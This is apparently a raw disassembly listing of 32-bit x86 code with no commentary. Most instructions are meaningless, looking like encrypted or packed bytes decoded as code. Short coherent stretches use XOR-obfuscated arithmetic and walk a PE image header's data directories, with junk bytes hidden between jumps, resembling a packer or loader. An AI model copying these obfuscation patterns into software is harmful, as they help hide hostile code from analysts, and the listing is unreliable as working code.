  408ce5:	xchg   BYTE PTR [ebx-0x5e92e41],bh
  408ceb:	mov    ah,0xc2
  408ced:	add    al,0xe2
  408cef:	cmp    bh,BYTE PTR [eax-0x6806bd7f]
  408cf5:	jnp    0x408c84
  408cf7:	cmp    esp,DWORD PTR [ebx]
  408cf9:	sbb    BYTE PTR [edi-0x2c],al
  408cfc:	stos   BYTE PTR es:[edi],al
  408cfd:	xor    BYTE PTR [ebp+0x7601a2a],al
  408d03:	xchg   esi,eax
  408d04:	ud1    ecx,DWORD PTR [eax+0x45]
  408d08:	xor    al,BYTE PTR [ecx+0x23]
  408d0b:	cmp    al,BYTE PTR [ebx-0x77]
  408d0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d0f:	push   0x9b37ef61
  408d14:	push   cs
  408d15:	pop    ds
  408d16:	loopne 0x408d56
  408d18:	xchg   esi,eax
  408d19:	aam    0x48
  408d1b:	jnp    0x408d1c
  408d1d:	int3   
  408d1e:	enter  0x5eed,0x1
  408d22:	pop    edi
  408d23:	gs dec esi
  408d25:	sub    eax,0xe1243486
  408d2a:	leave  
  408d2b:	test   al,0x4a
  408d2d:	int3   
  408d2e:	push   ecx
  408d2f:	mov    al,ds:0x20fafbe8
  408d34:	sub    eax,0x5bac06b0
  408d39:	in     al,0xc4
  408d3b:	jge    0x408d94
  408d3d:	push   ss
  408d3e:	loope  0x408d0e
  408d40:	ret    
  408d41:	shl    DWORD PTR [ebp+esi*1-0xedf6189],0xf5
  408d49:	gs scas al,BYTE PTR es:[edi]
  408d4b:	ins    DWORD PTR es:[edi],dx
  408d4c:	aaa    
  408d4d:	push   0xe329d41a
  408d52:	ins    DWORD PTR es:[edi],dx
  408d53:	mov    esi,0x64164910
  408d58:	call   0x50216518
  408d5d:	jb     0x408d4b
  408d5f:	repnz aam 0x8d
  408d62:	loope  0x408d2a
  408d64:	mov    al,BYTE PTR [ebx+0x27c351c8]
  408d6a:	outs   dx,DWORD PTR ds:[esi]
  408d6b:	jb     0x408d0f
  408d6d:	cmp    al,0xde
  408d6f:	cli    
  408d70:	addr16 pop ebp
  408d72:	popf   
  408d73:	xchg   BYTE PTR [edx-0x51e6dad3],ch
  408d79:	addr16 call 0x4d1d3f0
  408d7f:	push   ebp
  408d80:	and    eax,DWORD PTR gs:[edi+0x1c]
  408d84:	not    DWORD PTR [ebx+0x4376d05a]
  408d8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d8b:	fmulp  st(7),st
  408d8d:	xor    dh,bh
  408d8f:	jmp    0xaa6:0x6fccaed3
  408d96:	repz repnz std 
  408d99:	pop    esi
  408d9a:	sbb    eax,0x53ed388a
  408d9f:	aaa    
  408da0:	push   ss
  408da1:	dec    edi
  408da2:	pcmpeqw mm5,QWORD PTR [esi+0x2b]
  408da6:	mov    esp,0xba03cc25
  408dab:	mov    ah,0xde
  408dad:	dec    esp
  408dae:	out    dx,al
  408daf:	add    esi,ebp
  408db1:	sbb    BYTE PTR [ebx],dl
  408db3:	inc    ecx
  408db4:	arpl   WORD PTR [eax],si
  408db6:	mov    ebp,0x22dbc1ec
  408dbb:	push   eax
  408dbc:	sahf   
  408dbd:	and    edi,esi
  408dbf:	cmp    eax,0xe5c17710
  408dc4:	lock mov edx,0xaa43a7fd
  408dca:	stc    
  408dcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408dcc:	mov    ah,0xe5
  408dce:	rcl    DWORD PTR [esi+0x295ea84d],1
  408dd4:	sbb    BYTE PTR [esi],ah
  408dd6:	sbb    al,0x27
  408dd8:	js     0x408e10
  408dda:	ins    BYTE PTR es:[edi],dx
  408ddb:	setp   ah
  408dde:	imul   BYTE PTR [esi]
  408de0:	pop    es
  408de1:	mov    esp,0x6084c85c
  408de6:	pop    ds
  408de7:	mov    eax,ds:0xc6fc9a56
  408dec:	(bad)  
  408ded:	pushf  
  408dee:	xchg   ecx,eax
  408def:	jmp    DWORD PTR [ecx]
  408df1:	repz jno 0x408d75
  408df4:	xchg   ecx,eax
  408df5:	mov    edx,0xcacebb1a
  408dfa:	popf   
  408dfb:	xchg   esp,eax
  408dfc:	xchg   BYTE PTR [ebp+eiz*8+0x6b],dh
  408e00:	lahf   
  408e01:	xor    BYTE PTR [edx],bl
  408e03:	sub    esp,eax
  408e05:	cmp    DWORD PTR [edx+0x759bc384],ebp
  408e0b:	ins    BYTE PTR es:[edi],dx
  408e0c:	or     ch,BYTE PTR [esi-0x1a7448e1]
  408e12:	in     al,0xc9
  408e14:	xchg   esi,eax
  408e15:	jno    0x408dd3
  408e17:	pushf  
  408e18:	icebp  
  408e19:	cmp    eax,0xe863dabe
  408e1e:	ror    ebp,0xc5
  408e21:	in     eax,0x54
  408e23:	ins    DWORD PTR es:[edi],dx
  408e24:	dec    ebp
  408e25:	fsub   DWORD PTR [esi-0x75]
  408e28:	inc    ebp
  408e29:	cld    
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0x306aadd5
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	push   esp
  408ec5:	(bad)  
  408ec6:	test   al,0x48
  408ec8:	es call 0xf196ea42
  408ece:	call   0x645dbb9d
  408ed3:	dec    ebp
  408ed4:	jge    0x408ed8
  408ed6:	scas   al,BYTE PTR es:[edi]
  408ed7:	jecxz  0x408ee5
  408ed9:	cmp    eax,0xfb21d923
  408ede:	int3   
  408edf:	rcr    ebx,cl
  408ee1:	mov    edi,0xea6a1995
  408ee6:	ret    0x93d
  408ee9:	cld    
  408eea:	outs   dx,DWORD PTR ds:[esi]
  408eeb:	inc    eax
  408eec:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408eee:	push   es
  408eef:	out    0x9a,al
  408ef1:	mov    ds:0x2ab273f,al
  408ef6:	ret    0x1bb0
  408ef9:	in     eax,0xcc
  408efb:	push   ebp
  408efc:	mov    ecx,0x1f36d0b1
  408f01:	arpl   WORD PTR [edx],di
  408f03:	mov    eax,0x2b1c0f5c
  408f08:	cmp    BYTE PTR [ecx],0xe0
  408f0b:	pusha  
  408f0c:	stos   DWORD PTR es:[edi],eax
  408f0d:	cmp    BYTE PTR [ebx],ah
  408f0f:	push   esp
  408f10:	loopne 0x408f30
  408f12:	fnstcw WORD PTR [ebx-0x7c]
  408f15:	fcomi  st,st(1)
  408f17:	cmp    ah,BYTE PTR [eax+ebp*8]
  408f1a:	mul    bl
  408f1c:	pop    ecx
  408f1d:	xor    DWORD PTR [esi+0x62],0xffffffbd
  408f21:	sbb    ecx,edi
  408f23:	jmp    0x408f0c
  408f25:	jmp    0x35c:0x18f2d700
  408f2c:	inc    ebx
  408f2d:	pop    ebx
  408f2e:	push   cs
  408f2f:	rcr    DWORD PTR [eax],cl
  408f31:	inc    esi
  408f32:	aam    0x54
  408f34:	add    eax,0x290b1a2b
  408f39:	jl     0x408f4a
  408f3b:	inc    esp
  408f3c:	jecxz  0x408f7f
  408f3e:	in     eax,dx
  408f3f:	or     DWORD PTR [ebp-0x467a10bd],esp
  408f45:	std    
  408f46:	daa    
  408f47:	popf   
  408f48:	cli    
  408f49:	and    ecx,DWORD PTR [esi]
  408f4b:	je     0x408eeb
  408f4d:	mov    BYTE PTR [ebx-0x2f5c541c],bh
  408f53:	mov    BYTE PTR [ecx],dl
  408f55:	dec    ebp
  408f56:	outs   dx,DWORD PTR ds:[esi]
  408f57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f58:	gs out dx,eax
  408f5a:	jmp    0x60a9:0xfdf936b1
  408f61:	daa    
  408f62:	mov    dh,0x5
  408f64:	js     0x408fbb
  408f66:	test   DWORD PTR [esi-0x78],0x81e99c10
  408f6d:	inc    edx
  408f6e:	ins    DWORD PTR es:[edi],dx
  408f6f:	out    0xeb,eax
  408f71:	in     al,0xd8
  408f73:	jns    0x408f29
  408f75:	adc    BYTE PTR [ebp+eiz*4-0x11],al
  408f79:	mov    dh,dh
  408f7b:	addr16 xchg esp,eax
  408f7d:	dec    esp
  408f7e:	(bad)  
  408f7f:	lds    ebp,FWORD PTR [ebx]
  408f81:	(bad)  
  408f83:	push   ecx
  408f84:	iret   
  408f85:	in     eax,0x78
  408f87:	(bad)  
  408f88:	test   BYTE PTR [ecx],cl
  408f8a:	outs   dx,BYTE PTR ds:[esi]
  408f8b:	or     DWORD PTR [ebp-0x48],esp
  408f8e:	jle    0x408f21
  408f90:	enter  0x8368,0x73
  408f94:	sahf   
  408f95:	retf   
  408f96:	or     al,0xb0
  408f98:	hlt    
  408f99:	xchg   eax,ecx
  408f9b:	call   0x774bed07
  408fa0:	cli    
  408fa1:	(bad)  
  408fa2:	cmc    
  408fa3:	jp     0x408f41
  408fa5:	sub    BYTE PTR [eax-0x37],dh
  408fa8:	sahf   
  408fa9:	scas   eax,DWORD PTR es:[edi]
  408faa:	out    0x13,eax
  408fac:	out    0x46,al
  408fae:	mov    esi,0xfe2bb05b
  408fb3:	adc    ebx,edi
  408fb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fb6:	fimul  WORD PTR [edx+0x5]
  408fb9:	push   0x62
  408fbb:	xchg   ebx,eax
  408fbc:	cli    
  408fbd:	jp     0x408f4f
  408fbf:	call   0xaa266be6
  408fc4:	bound  esi,QWORD PTR [ebx-0x2d3db87c]
  408fca:	or     eax,0xeac76c22
  408fcf:	scas   al,BYTE PTR es:[edi]
  408fd0:	inc    ebp
  408fd1:	mov    ebp,DWORD PTR [edx]
  408fd3:	mov    edi,0x78e4b48c
  408fd8:	lods   eax,DWORD PTR ds:[esi]
  408fd9:	mov    ecx,0x47a5bebc
  408fde:	xor    al,0x33
  408fe0:	out    0xfc,eax
  408fe2:	and    dh,BYTE PTR [ebp+0x1de8e359]
  408fe8:	mov    ds:0xbecaa120,eax
  408fed:	aad    0xb
  408fef:	dec    esi
  408ff0:	repnz or eax,0x3a8aa20
  408ff6:	add    ebx,esi
  408ff8:	in     eax,dx
  408ff9:	or     esp,DWORD PTR [esi+ebp*4-0x70]
  408ffd:	outs   dx,DWORD PTR ds:[esi]
  408ffe:	ror    DWORD PTR [eax+0x78795d92],cl
  409004:	xor    eax,0x4c7fa36c
  409009:	ret    
  40900a:	dec    esp
  40900b:	or     eax,esp
  40900d:	adc    eax,0x9a736cbd
  409012:	retf   0x6a62
  409015:	adc    eax,0x68c16395
  40901a:	neg    DWORD PTR [esi+edi*1]
  40901d:	scas   eax,DWORD PTR es:[edi]
  40901e:	sbb    ebx,DWORD PTR [ecx+0x3a553860]
  409024:	sti    
  409025:	xor    eax,0xcd3bcb66
  40902a:	mov    al,0xa2
  40902c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40902d:	gs call 0x10c7:0xee5f20c4
  409035:	sub    eax,0x7b0b92fe
  40903a:	jb     0x409037
  40903c:	fnop   
  40903e:	pop    ecx
  40903f:	fs jo  0x409075
  409042:	imul   esp,DWORD PTR [ecx+0x46900e63],0xffffffa5
  409049:	mov    cl,0xf5
  40904b:	mov    edi,0x40b4fd71
  409050:	cmc    
  409051:	pop    ebp
  409052:	push   ebp
  409053:	sbb    DWORD PTR [ebp-0x4b],ebx
  409056:	mov    cs,WORD PTR [edx]
  409058:	push   ebx
  409059:	dec    ebp
  40905a:	jmp    0x2867:0x531eb95d
  409061:	xchg   edx,eax
  409062:	cmp    eax,0x3292e90c
  409067:	sbb    al,0x6f
  409069:	in     eax,0x5e
  40906b:	fwait
  40906c:	in     al,0x7f
  40906e:	mov    ah,0x29
  409070:	loopne 0x40909a
  409072:	imul   ecx,DWORD PTR [eax-0x11774a98],0xe2552275
  40907c:	mov    edx,0x31fc824
  409081:	int3   
  409082:	mov    ds:0x1967cbb0,eax
  409087:	sbb    DWORD PTR [eax+0x26346333],ecx
  40908d:	loopne 0x4090f0
  40908f:	out    0x14,al
  409091:	ror    BYTE PTR [ebx-0x9722bee],0xb7
  409098:	das    
  409099:	mov    edi,0x2ef315fa
  40909e:	int    0x3b
  4090a0:	inc    eax
  4090a1:	push   eax
  4090a2:	pop    esi
  4090a3:	(bad)  
  4090a5:	or     DWORD PTR [ebp+0x36],0x7277a708
  4090ac:	push   ebp
  4090ad:	cs fs sub eax,0xe47d3723
  4090b4:	sar    bh,cl
  4090b6:	sti    
  4090b7:	icebp  
  4090b8:	xlat   BYTE PTR ds:[ebx]
  4090b9:	icebp  
  4090ba:	dec    ecx
  4090bb:	xchg   BYTE PTR [ebx],dh
  4090bd:	ror    edi,0x22
  4090c0:	mov    cl,0x7
  4090c2:	or     DWORD PTR [eax],ebp
  4090c4:	pop    edi
  4090c5:	sub    dl,BYTE PTR [esi-0x30]
  4090c8:	(bad)  
  4090ca:	jo     0x40909a
  4090cc:	pusha  
  4090cd:	pusha  
  4090ce:	sub    BYTE PTR [esi],al
  4090d0:	mov    ds:0xf69a1e06,al
  4090d5:	xchg   al,bh
  4090d7:	cmp    dl,bh
  4090d9:	loopne 0x409094
  4090db:	mov    ch,0x88
  4090dd:	add    BYTE PTR ds:0x6c2170b0,0x6f
  4090e4:	pusha  
  4090e5:	mov    ah,0x14
  4090e7:	inc    eax
  4090e8:	sbb    al,0x3c
  4090ea:	out    dx,al
  4090eb:	ja     0x4090f0
  4090ed:	adc    esi,DWORD PTR [ebx]
  4090ef:	mov    BYTE PTR [ebx],0xc7
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0x4c
  409163:	in     al,dx
  409164:	das    
  409165:	and    eax,0x7e7edf32
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	pop    edx
  40916f:	lea    ebp,[esp+edi*2]
  409172:	or     dh,dl
  409174:	fidiv  WORD PTR [edi]
  409176:	into   
  409177:	mov    WORD PTR [edi+ecx*1+0x6],ss
  40917b:	push   ss
  40917c:	mov    ch,0xe3
  40917e:	cmp    ebx,DWORD PTR [ebp+0x23d80390]
  409184:	pop    edx
  409185:	stos   DWORD PTR es:[edi],eax
  409186:	sbb    bl,dh
  409188:	aas    
  409189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40918a:	mov    ebp,0xaebc05f9
  40918f:	outs   dx,DWORD PTR ds:[esi]
  409190:	ja     0x4091fe
  409192:	es cmp al,0x48
  409195:	mov    ch,0x95
  409197:	mov    esp,0x3ad5b25e
  40919c:	aam    0x16
  40919e:	pop    ebp
  40919f:	mov    dh,0x9c
  4091a1:	inc    ebp
  4091a2:	mov    cl,0x8f
  4091a4:	add    eax,0x50835a41
  4091a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091aa:	inc    ebp
  4091ab:	push   0x4e
  4091ad:	add    eax,0x49bb6fb7
  4091b2:	xor    bl,BYTE PTR [esi-0x7a]
  4091b5:	inc    esi
  4091b6:	and    BYTE PTR [eax],0xbe
  4091b9:	retf   
  4091ba:	mov    ebp,DWORD PTR [esi]
  4091bc:	and    eax,DWORD PTR [edi+edx*2-0x7]
  4091c0:	test   DWORD PTR [edi],0x9c3ce0b6
  4091c6:	sub    BYTE PTR [ebx],ch
  4091c8:	call   0x2231:0xa03a6343
  4091cf:	sbb    DWORD PTR [eax],esp
  4091d1:	cdq    
  4091d2:	or     ecx,DWORD PTR [edx+0x73bd1dec]
  4091d8:	sbb    BYTE PTR [esi],ch
  4091da:	scas   eax,DWORD PTR es:[edi]
  4091db:	push   edx
  4091dc:	dec    ebx
  4091dd:	mov    DWORD PTR ds:0xb8806819,ecx
  4091e3:	jnp    0x4091a4
  4091e5:	icebp  
  4091e6:	mov    al,ds:0xbf34b220
  4091eb:	inc    esi
  4091ec:	jp     0x409217
  4091ee:	add    bh,dl
  4091f0:	and    BYTE PTR [ebx+0x74],dl
  4091f3:	mov    DWORD PTR [ecx],ebx
  4091f5:	add    BYTE PTR [esi],0x8f
  4091f8:	cs test al,0x1d
  4091fb:	add    bl,BYTE PTR [esi]
  4091fd:	(bad)  
  4091fe:	push   es
  4091ff:	dec    ebx
  409200:	jmp    0x90705a80
  409205:	into   
  409206:	and    al,BYTE PTR cs:[eax]
  409209:	add    DWORD PTR [edx-0x33a9852a],ebx
  40920f:	push   edi
  409210:	test   BYTE PTR [ebp-0x40],dh
  409213:	jg     0x409286
  409215:	in     eax,0x9d
  409217:	xor    DWORD PTR [eax],ebx
  409219:	(bad)  
  40921a:	in     eax,dx
  40921b:	stc    
  40921c:	or     BYTE PTR [edi-0x7f2e85c7],cl
  409222:	ret    0x9c74
  409225:	push   eax
  409226:	mov    al,0x9e
  409228:	mov    ah,bh
  40922a:	mov    ebx,0x5621adcb
  40922f:	test   eax,0x110ca6f3
  409234:	and    eax,ebp
  409236:	jnp    0x4091ba
  409238:	jecxz  0x409279
  40923a:	test   ebx,esp
  40923c:	loopne 0x409285
  40923e:	xchg   DWORD PTR [edi-0x1c],eax
  409241:	add    eax,0x9887fb82
  409246:	inc    edi
  409247:	cmp    eax,DWORD PTR [ecx-0x32]
  40924a:	scas   eax,DWORD PTR es:[edi]
  40924b:	lock jbe 0x40922e
  40924e:	outs   dx,BYTE PTR ds:[esi]
  40924f:	loop   0x4092a9
  409251:	cwde   
  409252:	loope  0x4092a1
  409254:	dec    edx
  409255:	jbe    0x4092c3
  409257:	sbb    eax,0xa3205df8
  40925c:	iret   
  40925d:	lods   eax,DWORD PTR ds:[esi]
  40925e:	xchg   ebx,eax
  40925f:	dec    ebx
  409260:	dec    ebp
  409261:	and    eax,0x64d4571b
  409266:	inc    edx
  409267:	jb     0x409200
  409269:	ss out 0x6b,eax
  40926c:	ins    BYTE PTR es:[edi],dx
  40926d:	pop    edx
  40926e:	lock lods al,BYTE PTR ds:[esi]
  409270:	int3   
  409271:	and    bl,ch
  409273:	pop    ss
  409274:	ds add eax,0x562e7bd6
  40927a:	fadd   st(7),st
  40927c:	int3   
  40927d:	mov    bl,0x58
  40927f:	les    ebp,FWORD PTR [esi+0x52]
  409282:	cmp    al,0x2b
  409284:	adc    eax,ebp
  409286:	retf   
  409287:	mov    cl,0x5a
  409289:	mov    dh,0x56
  40928b:	sti    
  40928c:	les    esi,FWORD PTR [ecx+0x48328a46]
  409292:	sub    al,0x6b
  409294:	inc    edi
  409295:	or     bh,bh
  409297:	or     BYTE PTR [esi-0x1e24d206],bh
  40929d:	lods   eax,DWORD PTR ds:[esi]
  40929e:	jns    0x409316
  4092a0:	push   0xffffff8b
  4092a2:	dec    edx
  4092a3:	dec    BYTE PTR [eax+eiz*8+0x71]
  4092a7:	popf   
  4092a8:	scas   eax,DWORD PTR es:[edi]
  4092a9:	and    dl,ch
  4092ab:	push   es
  4092ac:	lea    edx,[ebx+eiz*2+0x20e46b4c]
  4092b3:	leave  
  4092b4:	dec    edx
  4092b5:	cmp    ebp,DWORD PTR [ebx]
  4092b7:	jmp    0x40d9:0x998235ba
  4092be:	int3   
  4092bf:	sub    eax,0x109720d2
  4092c4:	cmp    al,BYTE PTR [edi]
  4092c6:	(bad)  
  4092c7:	aas    
  4092c8:	ds ins DWORD PTR es:[edi],dx
  4092ca:	pushf  
  4092cb:	mov    ecx,0xf125dfa8
  4092d0:	sub    dl,BYTE PTR [ebx+0x3f]
  4092d3:	mov    cl,0x3d
  4092d5:	inc    esi
  4092d6:	pop    ebp
  4092d7:	sbb    eax,0x3bb88ed6
  4092dc:	adc    ebx,DWORD PTR [esi-0x30f5550f]
  4092e2:	(bad)  
  4092e3:	aad    0x8d
  4092e5:	sub    esp,ecx
  4092e7:	sub    eax,0xc7fe451c
  4092ec:	fldenv [ebp-0x6dc3a610]
  4092f2:	ret    
  4092f3:	inc    ecx
  4092f4:	mov    ds:0xfdd649c3,al
  4092f9:	push   ebp
  4092fa:	ins    BYTE PTR es:[edi],dx
  4092fb:	pop    esp
  4092fc:	or     ebx,DWORD PTR [edi]
  4092fe:	pop    ebx
  4092ff:	inc    edi
  409300:	retf   0x78e8
  409303:	bound  edi,QWORD PTR [ebx+esi*4+0x28893609]
  40930a:	dec    ecx
  40930b:	not    BYTE PTR [ebx]
  40930d:	push   ebp
  40930e:	jecxz  0x409355
  409310:	sub    al,0x93
  409312:	inc    esp
  409313:	mov    bx,WORD PTR [eax+0x5bbe4ba0]
  40931a:	sbb    eax,0x1a6c550f
  40931f:	sub    al,0xc6
  409321:	inc    esp
  409322:	les    ebx,FWORD PTR [ebx]
  409324:	(bad)  
  409325:	xor    ebx,DWORD PTR [ebx+0x64]
  409328:	in     eax,dx
  409329:	and    esi,DWORD PTR [esi+ebx*2]
  40932c:	jge    0x4092bb
  40932e:	dec    ecx
  40932f:	mov    eax,ds:0x150745f6
  409334:	add    ebp,esp
  409336:	add    DWORD PTR [ebp-0x2815f695],0xffffff9c
  40933d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40933e:	mov    edx,0xbdb48b0e
  409343:	enter  0x857a,0xd3
  409347:	dec    edx
  409348:	std    
  409349:	or     BYTE PTR [esi+edi*2],bh
  40934c:	jno    0x409311
  40934e:	jp     0x4093bc
  409350:	xor    eax,0xe8b40c91
  409355:	fbld   TBYTE PTR [ecx+0x36]
  409358:	cmp    eax,esp
  40935a:	repz mov edx,0x130ee0aa
  409360:	retf   
  409361:	stc    
  409362:	enter  0xc2de,0xa8
  409366:	call   0x9672:0xa85573a4
  40936d:	xor    esi,ebx
  40936f:	cs aas 
  409371:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409373:	dec    edx
  409374:	ins    DWORD PTR es:[edi],dx
  409375:	ja     0x409313
  409377:	jp     0x4093cc
  409379:	lods   al,BYTE PTR ds:[esi]
  40937a:	cmc    
  40937b:	dec    ecx
  40937c:	push   esi
  40937d:	dec    ebx
  40937e:	icebp  
  40937f:	inc    ecx
  409380:	ins    DWORD PTR es:[edi],dx
  409381:	xor    eax,0xffdd5f5
  409386:	hlt    
  409387:	loopne 0x409396
  409389:	pop    edi
  40938a:	dec    eax
  40938b:	adc    al,0x12
  40938d:	xor    eax,0x87910a7a
  409392:	and    esi,ecx
  409394:	jge    0x4093ce
  409396:	dec    esp
  409397:	cmp    cl,BYTE PTR [ecx+0xc458b08]
  40939d:	mov    eax,DWORD PTR [ebp+0x8]
  4093a0:	push   DWORD PTR [ebp-0x8]
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	shl    BYTE PTR [esi+eax*1+0x2c],cl
  4093b8:	fcomp  st(5)
  4093ba:	jle    0x40943a
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	sbb    al,0x7c
  4093c2:	lea    edx,[edi-0x19a130ac]
  4093c8:	call   0x87428f52
  4093cd:	fisttp DWORD PTR [esi+0x16]
  4093d0:	(bad)  
  4093d1:	cdq    
  4093d2:	into   
  4093d3:	dec    esi
  4093d4:	mov    esp,0xc5652bee
  4093d9:	sbb    al,0xe7
  4093db:	(bad)  
  4093dc:	(bad)  
  4093dd:	out    0x87,eax
  4093df:	call   FWORD PTR [eax+0x14]
  4093e2:	adc    al,0xb0
  4093e4:	out    dx,al
  4093e5:	imul   ebp
  4093e7:	mov    ah,0xa1
  4093ea:	xchg   DWORD PTR [edx],ebx
  4093ec:	jl     0x409429
  4093ee:	retf   
  4093ef:	retf   0x5631
  4093f2:	cmp    ch,BYTE PTR [ebx-0x72]
  4093f5:	add    al,cl
  4093f7:	cmc    
  4093f8:	cdq    
  4093f9:	xchg   ebp,eax
  4093fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093fb:	sub    eax,0x20199f9b
  409400:	inc    eax
  409401:	xor    ah,BYTE PTR [ebx-0x51]
  409404:	or     ebx,DWORD PTR [ebp+0x52157668]
  40940a:	out    dx,al
  40940b:	loope  0x409405
  40940d:	push   esi
  40940e:	xchg   esp,eax
  40940f:	xor    BYTE PTR [ebx+ebp*2+0x3a],dh
  409413:	cmp    bl,BYTE PTR [edi+0x13]
  409416:	pop    edi
  409417:	cmp    ch,dh
  409419:	xchg   esp,eax
  40941a:	cdq    
  40941b:	cli    
  40941c:	daa    
  40941d:	pushf  
  40941e:	mov    ecx,0x9a65fd4
  409423:	les    edx,FWORD PTR [ebx+0x30edcba0]
  409429:	pop    ecx
  40942a:	jbe    0x4093dc
  40942c:	rcr    DWORD PTR ds:0x5c5f881,cl
  409432:	sbb    eax,0x1a573f0a
  409437:	addr16 cmovle esi,esi
  40943b:	ins    BYTE PTR es:[edi],dx
  40943c:	add    bl,bl
  40943e:	mov    ds:0xb53610f5,eax
  409443:	add    dh,ah
  409445:	sbb    edx,DWORD PTR [edx+0x11a403f]
  40944b:	add    DWORD PTR [edx],ecx
  40944d:	and    al,0xd5
  40944f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409450:	loopne 0x40940c
  409452:	adc    al,0x67
  409454:	dec    esp
  409455:	push   ebp
  409456:	popf   
  409457:	and    edi,ebp
  409459:	mov    dl,0x48
  40945b:	inc    ebp
  40945c:	imul   ebx,DWORD PTR [edx+0x63],0x1a
  409460:	mov    edx,eax
  409462:	jb     0x409477
  409464:	push   ebp
  409465:	pop    esi
  409466:	jnp    0x4093f7
  409468:	pusha  
  409469:	lock push 0xb0346991
  40946f:	mov    eax,0x75755b7c
  409474:	jne    0x4094e5
  409476:	xchg   ebp,eax
  409477:	pop    edx
  409478:	icebp  
  409479:	push   cs
  40947a:	jns    0x409484
  40947c:	idiv   DWORD PTR [esp+ecx*1]
  40947f:	cdq    
  409480:	pop    DWORD PTR [esi+0x39b0dd04]
  409486:	dec    edi
  409487:	int3   
  409488:	loop   0x409464
  40948a:	xchg   esp,eax
  40948b:	loop   0x40946b
  40948d:	add    dh,dh
  40948f:	sub    DWORD PTR [edi+0x67fba1a3],esp
  409495:	lahf   
  409496:	icebp  
  409497:	adc    eax,0x73e87760
  40949c:	adc    ebp,esi
  40949e:	fisttp DWORD PTR [esi+ebx*2-0x37255a7d]
  4094a5:	xchg   ecx,eax
  4094a6:	or     BYTE PTR [eax-0x5d],0xc
  4094aa:	and    DWORD PTR [eax-0x6a],esp
  4094ad:	jp     0x40952d
